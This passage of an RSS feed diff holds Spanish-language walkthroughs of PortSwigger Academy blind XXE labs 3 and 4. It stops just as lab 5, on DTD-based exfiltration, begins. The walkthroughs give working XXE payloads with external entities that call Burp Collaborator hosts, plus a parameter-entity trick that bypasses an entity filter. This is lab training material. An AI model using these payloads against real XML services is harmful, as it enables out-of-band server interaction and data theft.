+        <pubDate>Sun, 23 Jan 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/head.png" alt="Featured image of post Portswigger Academy Learning Path: XML external entity (XXE) Lab 3" /&gt;&lt;h1 id=&#34;lab-blind-xxe-with-out-of-band-interaction&#34;&gt;Lab: Blind XXE with out-of-band interaction&lt;/h1&gt;
+&lt;p&gt;La vulnerabilidad o el ataque de XXE es poder realizar una inyeccion XML en la aplicacion que analiza la entrada que le pasa el usuario o el sistema. Lo que hace que un analizados XML no este configuracion o este configurado debilmente para que procese peticiones que un usuario mal intencionado pueda inyectar. Pudiendo llegar a ejecucion de comandos, lectura de archivos y otros.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/xxe-injection.svg&#34; &gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/xxe-injection.svg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			alt=&#34;Proceso de XXE&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Proceso de XXE&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder realizar una inyeccion XXE pero en este caso de tipo blind valiendose de la configuracion debil del analizador.&lt;/p&gt;
+&lt;p&gt;Primero notamos la opcion de &lt;code&gt;Check stock&lt;/code&gt; de la web en la que recuperamos la existencia de los productos.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 127; 
+			flex-basis: 304px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/checkstock.png&#34; data-size=&#34;1760x1385&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/checkstock.png&#34;
+			width=&#34;1760&#34;
+			height=&#34;1385&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/checkstock_hu044b93324b0dd4a55e94b7edd731c2e3_1089674_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/checkstock_hu044b93324b0dd4a55e94b7edd731c2e3_1089674_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Check stock&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Check stock&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Al ir a la opcion de &lt;code&gt;Check stock&lt;/code&gt; en burp vemos la peticion que se hace al servidor usando lenguaje XML para realizar la peticion.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 198; 
+			flex-basis: 477px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/request1.png&#34; data-size=&#34;1143x575&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/request1.png&#34;
+			width=&#34;1143&#34;
+			height=&#34;575&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/request1_hucab137dbe407a570dc6285fcfad7e974_70437_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/request1_hucab137dbe407a570dc6285fcfad7e974_70437_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion para recuperar el stock del producto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion para recuperar el stock del producto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
+&lt;p&gt;Sabiendo la peticion que se hace lo primero que haremos sera explotar XXE pero del tipo blind esto a traves de declarar la DTD para luego referenciar la entidad a nuestro archivo que queremos leer que no existe pero el sistema automaticamente resolvera por medio de DNS y ahi es donde burpcollaborator entra en juego. Que es con la siguiente sintaxis. Luego se referencia en cualquiera del valor que se imprimira o recibira de la web que sera &lt;code&gt;productId&lt;/code&gt; referenciando con &lt;code&gt;&amp;amp;xxe;&lt;/code&gt;. Si no realizamos este proceso no podremos recuperar los datos. Asi que sabremos que se ejecuto cuando el sistema realice la peticion de DNS e intente conectarse. El codigo a inyectar XML sera:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://egyr8hd0zz07en40wc6bd8s46vcl0a.burpcollaborator.net/test&amp;#34;&amp;gt;&lt;/span&gt; ]&amp;gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;&lt;span class=&#34;ni&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Realizamos la peticion y luego veremos la respuesta en burp collaborator&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 233; 
+			flex-basis: 560px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/request2.png&#34; data-size=&#34;1286x551&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/request2.png&#34;
+			width=&#34;1286&#34;
+			height=&#34;551&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/request2_hueaf16a78e71dfe99179cab42e96c772e_80387_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/request2_hueaf16a78e71dfe99179cab42e96c772e_80387_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Recuperando el archivo /etc/passwd&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Recuperando el archivo /etc/passwd&lt;/figcaption&gt;
+	
+&lt;/figure&gt;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 231; 
+			flex-basis: 555px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/collaborator.png&#34; data-size=&#34;999x432&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/collaborator.png&#34;
+			width=&#34;999&#34;
+			height=&#34;432&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/collaborator_huff603963b9bc7db0a4dc2dc9e30eca88_20802_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/collaborator_huff603963b9bc7db0a4dc2dc9e30eca88_20802_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Log de consulta DNS y HTTP&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Log de consulta DNS y HTTP&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Y con esto hemos resuelto el lab.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 195; 
+			flex-basis: 470px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/resuelto.png&#34; data-size=&#34;1796x917&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/resuelto.png&#34;
+			width=&#34;1796&#34;
+			height=&#34;917&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/resuelto_hueb5c87be8dbb3addfb1928e4034ae42a_304993_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-3/resuelto_hueb5c87be8dbb3addfb1928e4034ae42a_304993_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
+        <title>Portswigger Academy Learning Path: XML external entity (XXE) Lab 4</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/</link>
+        <pubDate>Sun, 23 Jan 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/head.png" alt="Featured image of post Portswigger Academy Learning Path: XML external entity (XXE) Lab 4" /&gt;&lt;h1 id=&#34;lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities&#34;&gt;Lab: Blind XXE with out-of-band interaction via XML parameter entities&lt;/h1&gt;
+&lt;p&gt;La vulnerabilidad o el ataque de XXE es poder realizar una inyeccion XML en la aplicacion que analiza la entrada que le pasa el usuario o el sistema. Lo que hace que un analizados XML no este configuracion o este configurado debilmente para que procese peticiones que un usuario mal intencionado pueda inyectar. Pudiendo llegar a ejecucion de comandos, lectura de archivos y otros.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/xxe-injection.svg&#34; &gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/xxe-injection.svg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			alt=&#34;Proceso de XXE&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Proceso de XXE&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder realizar una inyeccion XXE pero en este caso de tipo blind valiendose de la configuracion debil del analizador.&lt;/p&gt;
+&lt;p&gt;Primero notamos la opcion de &lt;code&gt;Check stock&lt;/code&gt; de la web en la que recuperamos la existencia de los productos.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 127; 
+			flex-basis: 304px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/checkstock.png&#34; data-size=&#34;1760x1385&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/checkstock.png&#34;
+			width=&#34;1760&#34;
+			height=&#34;1385&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/checkstock_hu044b93324b0dd4a55e94b7edd731c2e3_1089674_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/checkstock_hu044b93324b0dd4a55e94b7edd731c2e3_1089674_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Check stock&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Check stock&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Al ir a la opcion de &lt;code&gt;Check stock&lt;/code&gt; en burp vemos la peticion que se hace al servidor usando lenguaje XML para realizar la peticion.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 212; 
+			flex-basis: 509px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/request1.png&#34; data-size=&#34;1192x561&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/request1.png&#34;
+			width=&#34;1192&#34;
+			height=&#34;561&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/request1_hu089fef698bfb3c518e1243595777632b_71000_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/request1_hu089fef698bfb3c518e1243595777632b_71000_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion para recuperar el stock del producto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion para recuperar el stock del producto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
+&lt;p&gt;Sabiendo la peticion que se hace lo primero que haremos sera explotar XXE pero del tipo blind esto a traves de declarar la DTD para luego referenciar la entidad a nuestro archivo que queremos leer que no existe pero el sistema automaticamente resolvera por medio de DNS y ahi es donde burpcollaborator entra en juego. Que es con la siguiente sintaxis. Luego se referencia en cualquiera del valor que se imprimira o recibira de la web que sera &lt;code&gt;productId&lt;/code&gt; referenciando con &lt;code&gt;&amp;amp;xxe;&lt;/code&gt;. Si no realizamos este proceso no podremos recuperar los datos. Asi que sabremos que se ejecuto cuando el sistema realice la peticion de DNS e intente conectarse. El codigo a inyectar XML sera:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://woogkixvp70djhv250l28xxf167wvl.burpcollaborator.net/test&amp;#34;&amp;gt;&lt;/span&gt; ]&amp;gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;&lt;span class=&#34;ni&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Realizamos la peticion y luego veremos la respuesta pero vemos que nos da una respuesta de error &lt;code&gt;&amp;quot;Entities are not allowed for security reasons&amp;quot;&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 248; 
+			flex-basis: 597px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/request2.png&#34; data-size=&#34;1274x512&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/request2.png&#34;
+			width=&#34;1274&#34;
+			height=&#34;512&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/request2_hu5a57a941d72680daf30eadefe89d32a7_72928_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/request2_hu5a57a941d72680daf30eadefe89d32a7_72928_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Realizando peticion para blind XXE&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Realizando peticion para blind XXE&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Asi que intentemos bypassear y la manera de solucionarlo es agregando el signo de &lt;code&gt;%&lt;/code&gt; al declarar la entidad y al momento de referenciar se olvida del &lt;code&gt;;&lt;/code&gt; y cambiar por &lt;code&gt;%&lt;/code&gt; despues de declarada la identidad haciendo que al final haga una solicitud a nuestro dominio.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % xxe SYSTEM &amp;#34;http://woogkixvp70djhv250l28xxf167wvl.burpcollaborator.net/test&amp;#34;&amp;gt;&lt;/span&gt; %xxe;]&amp;gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 242; 
+			flex-basis: 581px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/request3.png&#34; data-size=&#34;1264x522&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/request3.png&#34;
+			width=&#34;1264&#34;
+			height=&#34;522&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/request3_hu1cd601c6b60b08e23cd4138d54a5c2f3_71114_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/request3_hu1cd601c6b60b08e23cd4138d54a5c2f3_71114_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion de inyeccion XXE&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion de inyeccion XXE&lt;/figcaption&gt;
+	
+&lt;/figure&gt;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 202; 
+			flex-basis: 485px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/collaborator.png&#34; data-size=&#34;836x413&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/collaborator.png&#34;
+			width=&#34;836&#34;
+			height=&#34;413&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/collaborator_huaa978f4bfcf53f09d90bc4d4a95dce18_19612_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/collaborator_huaa978f4bfcf53f09d90bc4d4a95dce18_19612_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Log de consulta DNS y HTTP&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Log de consulta DNS y HTTP&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Y con esto hemos resuelto el lab.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 195; 
+			flex-basis: 470px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/resuelto.png&#34; data-size=&#34;1796x917&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/resuelto.png&#34;
+			width=&#34;1796&#34;
+			height=&#34;917&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/resuelto_hueb5c87be8dbb3addfb1928e4034ae42a_304993_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-4/resuelto_hueb5c87be8dbb3addfb1928e4034ae42a_304993_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
+        <title>Portswigger Academy Learning Path: XML external entity (XXE) Lab 5</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/</link>
+        <pubDate>Sun, 23 Jan 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/head.png" alt="Featured image of post Portswigger Academy Learning Path: XML external entity (XXE) Lab 5" /&gt;&lt;h1 id=&#34;lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd&#34;&gt;Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD&lt;/h1&gt;
+&lt;p&gt;La vulnerabilidad o el ataque de XXE es poder realizar una inyeccion XML en la aplicacion que analiza la entrada que le pasa el usuario o el sistema. Lo que hace que un analizados XML no este configuracion o este configurado debilmente para que procese peticiones que un usuario mal intencionado pueda inyectar. Pudiendo llegar a ejecucion de comandos, lectura de archivos y otros.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/xxe-injection.svg&#34; &gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/xxe-injection.svg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			alt=&#34;Proceso de XXE&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Proceso de XXE&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
